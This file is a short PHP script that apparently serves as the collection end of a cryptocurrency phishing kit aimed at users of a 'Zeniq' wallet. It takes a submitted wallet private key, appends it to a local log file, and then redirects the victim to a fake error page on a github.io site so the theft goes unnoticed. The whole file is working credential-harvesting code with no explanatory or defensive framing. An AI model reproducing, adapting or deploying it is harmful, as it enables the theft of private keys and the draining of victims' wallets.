
<?php
$file = "LAZADA12122023";
$ip   = getenv("REMOTE_ADDR");
$PrivateKey   = $_POST['PrivateKey'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "ZENIQQ :: ");
fwrite($handle, "$PrivateKey");
fwrite($handle, "\n");
fwrite($handle, "S3MP4K-B4NK.COM");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://Zeniq-real-Coin.github.io/Dubay/now/zeniqwallet/error.html#confirm-page-container-navigation\";
// -->
</script>";
?>


